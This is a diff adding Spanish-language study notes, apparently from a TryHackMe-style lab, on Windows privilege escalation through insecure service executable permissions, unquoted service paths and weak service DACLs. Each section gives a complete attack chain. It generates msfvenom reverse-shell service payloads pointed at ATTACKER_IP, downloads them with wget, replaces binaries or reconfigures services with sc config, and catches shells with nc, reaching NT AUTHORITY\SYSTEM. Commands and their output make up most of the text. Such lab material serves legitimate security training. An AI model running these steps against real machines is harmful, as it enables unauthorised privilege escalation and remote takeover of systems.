@@ -40,11 +40,258 @@ Existe una subclave para cada servicio en el sistema. Podemos ver el ejecutable 
 
 ------------------------------
 <h2>Insecure Permissions on Service Executable</h2>
+Si el ejecutable asociado con un servicio tiene permisos débiles que nos permiten editarlo o reemplazarlo, podemos ganar los privilegios de la cuenta ejecutora.
 
+Para entender cómo funciona esto, miremos una vulnerabilidad encontrada en el Splinterware System Scheduler. Para empezar, veremos la configuración del servicio usando `sc`:
+
+```cmd
+C:\> sc qc WindowsScheduler
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: windowsscheduler
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : System Scheduler Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcuser1
+```
+
+Podemos ver que el servicio instalado por el software vulnerable corre como `svcuser1` y el ejecutable asociado con el servicio es `C:\Progra~2\System~11\WServicr.exe`. Ahora tenemos que comprobar los permisos del ejecutable:
+
+```cmd
+C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
+C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
+                                  NT AUTHORITY\SYSTEM:(I)(F)
+                                  BUILTIN\Administrators:(I)(F)
+                                  BUILTIN\Users:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
+                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+Y aquí vemos algo interesante, todo el mundo (grupo Everyone) tiene permiso para modificar el archivo ejecutable. Esto significa que podemos sobrescribirlo o reemplazarlo para que se ejecute un payload con los permisos del usuario.
+
+Generaremos un payload de servicio exe usando msfvenom y lo compartiremos mediante python:
+
+```cmd
+user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
+
+user@attackerpc$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+Luego nos lo descargamos en la máquina objetivo:
+
+`wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe`
+
+Una vez que el payload esté en el servidor, lo reemplazamos por el binario legítimo. Como necesitamos que otro usuario lo ejecute, le tenemos que dar permisos suficientes.
+
+```cmd
+C:\> cd C:\PROGRA~2\SYSTEM~1\
+
+C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
+        1 file(s) moved.
+
+C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+
+Arrancamos un listener en la máquina atacante:
+
+`nc -lvp 4445`
+
+Y esperamos.
+
+```bash
+user@attackerpc$ nc -lvp 4445
+Listening on 0.0.0.0 4445
+Connection received on 10.10.175.90 50649
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+wprivesc1\svcusr1
+```
 
 ------------------------------------
 <h2>Unquoted Service Paths</h2>
+Cuando no podemos escribir directamente en el ejecutable del servicio como antes, puede que siga habiendo una manera de ejecutar ejecutables arbitrarios usando una funcionalidad oculta.
 
+Al trabajar con servicios Windows, ocurre un comportamiento bastante peculiar cuando el servicio está configurado para apuntar a un ejecutable que no está citado de manera exacta. Por ejemplo, que no tenga en cuenta los espacios, etc.
+
+Como ejemplo, miremos la diferencia entre dos servicios. El primer servicio está bien quoteado y el segundo no.
+
+Primer servicio:
+
+```powershell
+C:\> sc qc "vncserver"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: vncserver
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : VNC Server
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+>[!NOTE] Fíjate en las comillas en el servicio.
+
+Segundo servicio:
+
+```powershell
+C:\> sc qc "disk sorter enterprise"
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: disk sorter enterprise
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 0   IGNORE
+        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Disk Sorter Enterprise
+        DEPENDENCIES       :
+        SERVICE_START_NAME : .\svcusr2
+```
+
+Cuando el SCM intenta ejecutar el binario asociado, surge un problema. Debido a que hay espacios en el nombre del directorio `Disk Sorter Enterprise`, el comando se vuelve ambiguo y SCM no sabe cual de los siguientes estás intentando ejecutar:
+
+| Command                                              | Argument 1                 | Argument 2                 |
+| ---------------------------------------------------- | -------------------------- | -------------------------- |
+| C:\MyPrograms\Disk.exe                               | Sorter                     | Enterprise\bin\disksrs.exe |
+| C:\MyPrograms\Disk Sorter.exe                        | Enterprise\bin\disksrs.exe |                            |
+| C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe |                            |                            |
+
+Esto se debe a la forma de parsear los comandos. Cuando tu ejecutas un comando, normalmente estos espacios son separadores a no ser que se escapen correctamente.
+
+En lugar de crashear, SCM intenta ayudar al usuario y empieza a buscar los binarios en el orden de la lista de arriba.
+
+Debido a este comportamiento, podemos crear cualquiera de los dos primeros ejecutables buscados por el programa que fuercen la ejecución de un ejecutable malicioso.
+
+Aunque parece trivial, por lo general no es realizable la explotación de esta vulnerabilidad ya que los programas suelen guardarse bajo la ruta `C:\Program Files` o `C:\Program Files (x86)` por defecto, la cual no es escribible.
+
+>[!IMPORTANT] Esta vulnerabilidad sólo es explotable cuando el administrador ha decidido guardar los programas en una ruta alternativa que tiene permisos de escritura.
+
+En nuestro caso, el administrador los instala en `C:\MyPrograms`. Por defecto, hereda los permisos del directorio `C:\`, permitiendo a cualquier usuario crear archivos y directorios dentro. Lo comprobamos usando `icacls`:
+
+```powershell
+C:\>icacls c:\MyPrograms
+c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+              BUILTIN\Administrators:(I)(OI)(CI)(F)
+              BUILTIN\Users:(I)(OI)(CI)(RX)
+              BUILTIN\Users:(I)(CI)(AD)
+              BUILTIN\Users:(I)(CI)(WD)
+              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+
+Successfully processed 1 files; Failed processing 0 files
+```
+
+El grupo `BUILTIN\\Users` tiene privilegios `AD` y `WD`, permitiendo al usuario crear subdirectorios y archivos, respectivamente.
+
+Realizamos el mismo proceso que antes para crear un payload de servicio exe con `msfvenom` y lo subimos a la máquina.
+
+```bash
+user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
+
+user@attackerpc$ nc -lvp 4446
+```
+
+Una vez tenemos el payload en el servidor, lo movemos a `C:\MyPrograms\Disk.exe` y le damos a Everyone permisos full (F) sobre el archivo para asegurarnos de que puede ser ejecutado.
+
+```powershell
+C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+
+C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+        Successfully processed 1 files.
+```
+
+Una vez que el servicio se reinicie se ejecutará el payload. Como resultado obtendremos una shell con privilegios `svcusr2`.
+
+```bash
+user@attackerpc$ nc -lvp 4446
+Listening on 0.0.0.0 4446
+Connection received on 10.10.175.90 50650
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+wprivesc1\svcusr2
+```
 
 --------------------------------------
 <h2>Insecure Service Permissions</h2>
+Puede que sigas teniendo alguna remota posibilidad de aprovecharte del servicio incluso si el DACL del ejecutable está bien configurado, y el path del binario del servicio bien quoteado. Si el DACL del servicio (no el DACL del ejecutable del servicio) te permite modificar la configuración de un servicio, serás capaz de reconfigurar el servicio. Esto te permitirá apuntar a cualquier ejecutable que quieras y ejecutarlo incluso con la cuenta SYSTEM.
+
+Para comprobar el DACL del servicio desde la linea de comandos, puedes usar [Accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) de la suite Sysinternals.
+
+```powershell
+C:\tools\AccessChk> accesschk64.exe -qlc thmservice
+  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_PAUSE_CONTINUE
+        SERVICE_START
+        SERVICE_STOP
+        SERVICE_USER_DEFINED_CONTROL
+        READ_CONTROL
+  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
+        SERVICE_ALL_ACCESS
+```
+
+Aquí podemos ver que el grupo `BUILTIN\\Users` tiene el permiso **SERVICE_ALL_ACCESS**, lo que significa que cualquier usuario puede reconfigurar el servicio.
+
+Antes de cambiar el servicio, creamos y compartimos el payload de servicio exe con `msfvenom`:
+
+```bash
+user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
+
+user@attackerpc$ nc -lvp 4447
+```
+
+Lo transferimos a `C:\Users\thm-unpriv\rev-svc3.exe`. Le tenemos que dar permisos para que cualquiera pueda hacerlo tofo (F):
+
+`icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F`
+
+Para cambiar el ejecutable y cuenta asociado al servicio, podemos usar el siguiente comando.
+
+>[!CAUTION] Fíjate en los espacios después de los signos igual al usar `sc.exe`.
+
+```powershell
+C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
+```
+
+Como podemos usar cualquier cuenta para correr el ejecutable, seleccionamos LocalSystem ya que es la cuenta disponible con los privilegios más elevados. Reiniciamos el servicio:
+
+```powershell
+C:\> sc stop THMService
+C:\> sc start THMService
+```
+
+Y recibiremos la shell.
+
+```bash
+user@attackerpc$ nc -lvp 4447
+Listening on 0.0.0.0 4447
+Connection received on 10.10.175.90 50650
+Microsoft Windows [Version 10.0.17763.1821]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+NT AUTHORITY\SYSTEM
+```
+
